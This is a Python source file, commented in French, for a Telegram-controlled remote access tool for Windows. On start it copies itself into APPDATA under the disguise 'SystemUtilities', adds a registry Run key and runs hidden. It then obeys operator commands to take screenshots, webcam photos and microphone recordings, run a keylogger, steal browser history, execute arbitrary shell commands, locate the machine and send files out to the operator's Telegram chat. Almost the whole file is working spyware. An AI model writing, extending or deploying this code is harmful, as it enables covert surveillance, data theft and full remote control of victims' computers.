import os
import socket
import ctypes
import subprocess
import requests
from PIL import ImageGrab
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import shutil
import sys
import winreg
import platform
import psutil
import cv2
import time
import sounddevice as sd
import numpy as np
import wave
import keyboard
import pygetwindow as gw
import browserhistory as bh
import zipfile
import tempfile
from cryptography.fernet import Fernet

# Configuration
TELEGRAM_TOKEN = "your tocken here"  # Remplacez par votre token Telegram
CHAT_ID = "your chat ID"  # Remplacez par votre chat ID
ENCRYPTION_KEY = Fernet.generate_key()  # Clé pour le chiffrement des fichiers
cipher_suite = Fernet(ENCRYPTION_KEY)

# Fonction pour obtenir les informations système détaillées
def get_system_info():
    try:
        system_info = {
            "Système": platform.system(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processeur": platform.processor(),
            "Nom d'hôte": socket.gethostname(),
            "Nom d'utilisateur": os.getenv("USERNAME"),
            "Architecture": platform.architecture()[0],
            "Mémoire totale": f"{round(psutil.virtual_memory().total / (1024**3), 2)} Go",
            "Mémoire disponible": f"{round(psutil.virtual_memory().available / (1024**3), 2)} Go",
            "CPU": f"{psutil.cpu_percent()}%",
            "Disques": [],
            "Réseau": [],
            "Processus en cours": len(psutil.pids()),
            "Batterie": None
        }

        # Informations sur les disques
        for partition in psutil.disk_partitions():
            usage = psutil.disk_usage(partition.mountpoint)
            system_info["Disques"].append({
                "Disque": partition.device,
                "Type": partition.fstype,
                "Total": f"{round(usage.total / (1024**3), 2)} Go",
                "Utilisé": f"{round(usage.used / (1024**3), 2)} Go",
                "Libre": f"{round(usage.free / (1024**3), 2)} Go",
                "Pourcentage": f"{usage.percent}%"
            })

        # Informations réseau
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    system_info["Réseau"].append({
                        "Interface": interface,
                        "Adresse IP": addr.address,
                        "Masque": addr.netmask
                    })

        # Informations sur la batterie (si portable)
        if hasattr(psutil, "sensors_battery"):
            battery = psutil.sensors_battery()
            if battery:
                system_info["Batterie"] = {
                    "Pourcentage": f"{battery.percent}%",
                    "Branché": "Oui" if battery.power_plugged else "Non"
                }

        return system_info
    except Exception as e:
        return f"Erreur lors de la récupération des informations système: {str(e)}"

# Fonction pour formater les informations système en texte
def format_system_info(info):
    if isinstance(info, str):
        return info
    
    formatted = "=== Informations Système ===\n"
    for key, value in info.items():
        if isinstance(value, list):
            formatted += f"\n{key}:\n"
            for item in value:
                if isinstance(item, dict):
                    formatted += "  - " + ", ".join(f"{k}: {v}" for k, v in item.items()) + "\n"
                else:
                    formatted += f"  - {item}\n"
        elif isinstance(value, dict):
            formatted += f"\n{key}:\n"
            formatted += "  - " + ", ".join(f"{k}: {v}" for k, v in value.items()) + "\n"
        else:
            formatted += f"{key}: {value}\n"
    return formatted

# Fonction pour obtenir l'adresse IP locale
def get_ip():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except:
        return "Non disponible"

# Fonction pour obtenir l'IP publique
def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        data = response.json()
        return data.get("ip", "Non disponible")
    except Exception as e:
        return f"Erreur: {str(e)}"

# Fonction pour obtenir la géolocalisation
def get_location():
    try:
        ip = get_public_ip()
        if ip.startswith("Erreur"):
            return ip
        
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = response.json()
        
        info = {
            "IP": ip,
            "Ville": data.get("city", "Inconnu"),
            "Région": data.get("region", "Inconnu"),
            "Pays": data.get("country", "Inconnu"),
            "Localisation": data.get("loc", "Inconnu"),
            "Fournisseur": data.get("org", "Inconnu")
        }
        
        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception as e:
        return f"Erreur de géolocalisation: {str(e)}"

# Fonction pour configurer le démarrage automatique
def setup_autostart():
    try:
        script_path = os.path.abspath(sys.argv[0])
        target_dir = os.path.join(os.getenv("APPDATA"), "SystemUtilities")
        os.makedirs(target_dir, exist_ok=True)
        
        # Copier le script dans le répertoire cible
        target_script = os.path.join(target_dir, "system_utils.py")
        if script_path != target_script:
            shutil.copy(script_path, target_script)
        
        # Créer un fichier batch
        batch_file = os.path.join(target_dir, "start.bat")
        with open(batch_file, "w") as f:
            f.write(f"@echo off\nstart /min pythonw \"{target_script}\"\nexit")
        
        # Ajouter au registre
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "SystemUtilities", 0, winreg.REG_SZ, batch_file)
        
        return "Démarrage automatique configuré avec succès."
    except Exception as e:
        return f"Erreur de configuration: {str(e)}"

# Fonction pour capturer l'écran
def capture_screen():
    try:
        screenshot = ImageGrab.grab()
        filename = f"screenshot_{int(time.time())}.jpg"
        screenshot.save(filename)
        return filename
    except Exception as e:
        return f"Erreur de capture: {str(e)}"

# Fonction pour capturer avec la webcam
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "Impossible d'accéder à la webcam"
        
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            filename = f"webcam_{int(time.time())}.jpg"
            cv2.imwrite(filename, frame)
            return filename
        else:
            return "Échec de la capture webcam"
    except Exception as e:
        return f"Erreur webcam: {str(e)}"

# Fonction pour enregistrer le microphone
def record_audio(duration=5):
    try:
        fs = 44100  # Fréquence d'échantillonnage
        filename = f"audio_{int(time.time())}.wav"
        
        print(f"Enregistrement audio pendant {duration} secondes...")
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()  # Attendre la fin de l'enregistrement
        
        with wave.open(filename, 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes(recording.tobytes())
        
        return filename
    except Exception as e:
        return f"Erreur d'enregistrement audio: {str(e)}"

# Fonction pour capturer les fenêtres actives
def get_active_windows():
    try:
        windows = gw.getAllTitles()
        active = [win for win in windows if win]
        return "\n".join(active) if active else "Aucune fenêtre active trouvée"
    except Exception as e:
        return f"Erreur: {str(e)}"

# Fonction pour capturer l'historique du navigateur
def get_browser_history():
    try:
        history = bh.get_browserhistory()
        result = []
        
        for browser, data in history.items():
            result.append(f"\n=== {browser} ===")
            for item in data:
                result.append(f"{item[0]} - {item[1]} ({item[2]})")
        
        if not result:
            return "Aucun historique trouvé"
        
        # Sauvegarder dans un fichier
        filename = f"browser_history_{int(time.time())}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("\n".join(result))
        
        return filename
    except Exception as e:
        return f"Erreur historique: {str(e)}"

# Fonction pour chiffrer un fichier
def encrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        encrypted_data = cipher_suite.encrypt(file_data)
        
        encrypted_file = filepath + ".encrypted"
        with open(encrypted_file, 'wb') as f:
            f.write(encrypted_data)
        
        return encrypted_file
    except Exception as e:
        return f"Erreur de chiffrement: {str(e)}"

# Fonction pour déchiffrer un fichier
def decrypt_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            encrypted_data = f.read()
        
        decrypted_data = cipher_suite.decrypt(encrypted_data)
        
        decrypted_file = filepath.replace(".encrypted", "_decrypted")
        with open(decrypted_file, 'wb') as f:
            f.write(decrypted_data)
        
        return decrypted_file
    except Exception as e:
        return f"Erreur de déchiffrement: {str(e)}"

# Fonction pour compresser des fichiers
def compress_files(files, zip_name):
    try:
        with zipfile.ZipFile(zip_name, 'w') as zipf:
            for file in files:
                if os.path.exists(file):
                    zipf.write(file, os.path.basename(file))
        return zip_name
    except Exception as e:
        return f"Erreur de compression: {str(e)}"

# Fonction pour exécuter une commande shell
def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout if result.stdout else result.stderr
        
        if len(output) > 4000:  # Limite de taille pour Telegram
            filename = f"command_output_{int(time.time())}.txt"
            with open(filename, "w") as f:
                f.write(output)
            return filename
        return output or "Commande exécutée sans sortie"
    except subprocess.TimeoutExpired:
        return "Commande expirée (timeout)"
    except Exception as e:
        return f"Erreur: {str(e)}"

# Fonction pour envoyer un message système
def send_system_message(title, message):
    try:
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)  # 0x40 pour icône info
        return "Message envoyé"
    except Exception as e:
        return f"Erreur: {str(e)}"

# Fonction pour capturer les frappes clavier (keylogger)
class KeyLogger:
    def __init__(self):
        self.log_file = f"keylog_{int(time.time())}.txt"
        self.is_running = False
    
    def start(self):
        try:
            self.is_running = True
            with open(self.log_file, "a") as f:
                f.write(f"=== Keylogger démarré à {time.ctime()} ===\n")
            
            keyboard.on_release(self._on_key_release)
            return f"Keylogger démarré. Fichier: {self.log_file}"
        except Exception as e:
            return f"Erreur: {str(e)}"
    
    def stop(self):
        try:
            self.is_running = False
            keyboard.unhook_all()
            with open(self.log_file, "a") as f:
                f.write(f"\n=== Keylogger arrêté à {time.ctime()} ===\n")
            return f"Keylogger arrêté. Fichier: {self.log_file}"
        except Exception as e:
            return f"Erreur: {str(e)}"
    
    def _on_key_release(self, event):
        if self.is_running:
            with open(self.log_file, "a") as f:
                f.write(f"{event.name} ")

# Gestionnaire de commandes Telegram
async def start(update: Update, context: CallbackContext):
    await update.message.reply_text(
        "🖥️ Bot de Surveillance Système Actif\n"
        "Utilisez /help pour voir les commandes disponibles."
    )

async def help_command(update: Update, context: CallbackContext):
    help_text = (
        "🔧 Commandes Disponibles:\n\n"
        "🔍 Informations:\n"
        "/info - Informations système détaillées\n"
        "/network - Informations réseau\n"
        "/location - Géolocalisation\n\n"
        "📷 Capture:\n"
        "/screenshot - Capturer l'écran\n"
        "/webcam - Prendre une photo avec la webcam\n"
        "/audio [durée] - Enregistrement audio (défaut: 5s)\n\n"
        "⚙️ Contrôle:\n"
        "/cmd [commande] - Exécuter une commande\n"
        "/message [titre] [texte] - Afficher un message\n"
        "/windows - Lister les fenêtres actives\n\n"
        "📊 Surveillance:\n"
        "/browser - Historique des navigateurs\n"
        "/keylog [start/stop] - Keylogger\n\n"
        "🔐 Sécurité:\n"
        "/encrypt [fichier] - Chiffrer un fichier\n"
        "/decrypt [fichier] - Déchiffrer un fichier\n"
        "/compress [fichiers] - Compresser des fichiers\n\n"
        "⚡ Autres:\n"
        "/autostart - Configurer le démarrage automatique\n"
        "/restart - Redémarrer le bot\n"
        "/shutdown - Éteindre l'ordinateur"
    )
    await update.message.reply_text(help_text)

# Commandes d'information
async def system_info(update: Update, context: CallbackContext):
    info = get_system_info()
    formatted = format_system_info(info)
    await update.message.reply_text(formatted[:4000])  # Limite de caractères

async def network_info(update: Update, context: CallbackContext):
    info = {
        "IP locale": get_ip(),
        "IP publique": get_public_ip(),
        "Géolocalisation": get_location()
    }
    await update.message.reply_text("\n".join(f"{k}: {v}" for k, v in info.items()))

async def location_info(update: Update, context: CallbackContext):
    await update.message.reply_text(get_location())

# Commandes de capture
async def screenshot(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    filename = capture_screen()
    if filename.startswith("Erreur"):
        await update.message.reply_text(filename)
    else:
        await context.bot.send_document(chat_id=CHAT_ID, document=open(filename, "rb"))
        os.remove(filename)

async def webcam_capture(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    filename = capture_webcam()
    if filename.startswith("Erreur"):
        await update.message.reply_text(filename)
    else:
        await context.bot.send_document(chat_id=CHAT_ID, document=open(filename, "rb"))
        os.remove(filename)

async def audio_record(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    duration = 5
    if context.args and context.args[0].isdigit():
        duration = min(int(context.args[0]), 60)  # Limite à 60 secondes
    
    await update.message.reply_text(f"Enregistrement audio pendant {duration} secondes...")
    filename = record_audio(duration)
    
    if filename.startswith("Erreur"):
        await update.message.reply_text(filename)
    else:
        await context.bot.send_document(chat_id=CHAT_ID, document=open(filename, "rb"))
        os.remove(filename)

# Commandes de contrôle
async def execute_cmd(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /cmd [commande]")
        return
    
    command = " ".join(context.args)
    result = execute_command(command)
    
    if isinstance(result, str) and os.path.exists(result):
        await context.bot.send_document(chat_id=CHAT_ID, document=open(result, "rb"))
        os.remove(result)
    else:
        await update.message.reply_text(str(result)[:4000])  # Limite de caractères

async def system_message(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /message [titre] [texte]")
        return
    
    title = context.args[0]
    text = " ".join(context.args[1:])
    result = send_system_message(title, text)
    await update.message.reply_text(result)

async def active_windows(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    windows = get_active_windows()
    await update.message.reply_text(windows[:4000])  # Limite de caractères

# Commandes de surveillance
async def browser_history(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    filename = get_browser_history()
    if filename.startswith("Erreur"):
        await update.message.reply_text(filename)
    else:
        await context.bot.send_document(chat_id=CHAT_ID, document=open(filename, "rb"))
        os.remove(filename)

keylogger = KeyLogger()

async def keylog_control(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /keylog [start/stop]")
        return
    
    action = context.args[0].lower()
    if action == "start":
        result = keylogger.start()
    elif action == "stop":
        result = keylogger.stop()
        if not result.startswith("Erreur"):
            await context.bot.send_document(chat_id=CHAT_ID, document=open(keylogger.log_file, "rb"))
            os.remove(keylogger.log_file)
    else:
        result = "Action invalide. Utilisez 'start' ou 'stop'"
    
    await update.message.reply_text(result)

# Commandes de sécurité
async def encrypt_file_cmd(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /encrypt [chemin_du_fichier]")
        return
    
    filepath = " ".join(context.args)
    if not os.path.exists(filepath):
        await update.message.reply_text("Fichier introuvable")
        return
    
    result = encrypt_file(filepath)
    if result.startswith("Erreur"):
        await update.message.reply_text(result)
    else:
        await context.bot.send_document(chat_id=CHAT_ID, document=open(result, "rb"))
        os.remove(result)
        await update.message.reply_text("Fichier chiffré avec succès")

async def decrypt_file_cmd(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /decrypt [chemin_du_fichier]")
        return
    
    filepath = " ".join(context.args)
    if not os.path.exists(filepath):
        await update.message.reply_text("Fichier introuvable")
        return
    
    result = decrypt_file(filepath)
    if result.startswith("Erreur"):
        await update.message.reply_text(result)
    else:
        await context.bot.send_document(chat_id=CHAT_ID, document=open(result, "rb"))
        os.remove(result)
        await update.message.reply_text("Fichier déchiffré avec succès")

async def compress_files_cmd(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /compress [fichier1] [fichier2] ...")
        return
    
    files = context.args
    zip_name = f"archive_{int(time.time())}.zip"
    result = compress_files(files, zip_name)
    
    if result.startswith("Erreur"):
        await update.message.reply_text(result)
    else:
        await context.bot.send_document(chat_id=CHAT_ID, document=open(result, "rb"))
        os.remove(result)
        await update.message.reply_text("Fichiers compressés avec succès")

# Commandes système
async def autostart_setup(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    result = setup_autostart()
    await update.message.reply_text(result)

async def restart_bot(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    await update.message.reply_text("Redémarrage en cours...")
    os.execv(sys.executable, ['python'] + sys.argv)

async def shutdown_pc(update: Update, context: CallbackContext):
    if str(update.message.chat_id) != CHAT_ID:
        await update.message.reply_text("Accès refusé.")
        return
    
    await update.message.reply_text("Arrêt de l'ordinateur en cours...")
    if platform.system() == "Windows":
        os.system("shutdown /s /t 1")
    else:
        os.system("shutdown now")

# Fonction principale
def main():
    # Configurer le démarrage automatique
    setup_autostart()
    
    # Créer l'application Telegram
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Commandes de base
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    
    # Commandes d'information
    app.add_handler(CommandHandler("info", system_info))
    app.add_handler(CommandHandler("network", network_info))
    app.add_handler(CommandHandler("location", location_info))
    
    # Commandes de capture
    app.add_handler(CommandHandler("screenshot", screenshot))
    app.add_handler(CommandHandler("webcam", webcam_capture))
    app.add_handler(CommandHandler("audio", audio_record))
    
    # Commandes de contrôle
    app.add_handler(CommandHandler("cmd", execute_cmd))
    app.add_handler(CommandHandler("message", system_message))
    app.add_handler(CommandHandler("windows", active_windows))
    
    # Commandes de surveillance
    app.add_handler(CommandHandler("browser", browser_history))
    app.add_handler(CommandHandler("keylog", keylog_control))
    
    # Commandes de sécurité
    app.add_handler(CommandHandler("encrypt", encrypt_file_cmd))
    app.add_handler(CommandHandler("decrypt", decrypt_file_cmd))
    app.add_handler(CommandHandler("compress", compress_files_cmd))
    
    # Commandes système
    app.add_handler(CommandHandler("autostart", autostart_setup))
    app.add_handler(CommandHandler("restart", restart_bot))
    app.add_handler(CommandHandler("shutdown", shutdown_pc))
    
    # Démarrer le bot
    print("Bot démarré avec succès")
    app.run_polling()

if __name__ == "__main__":
    main()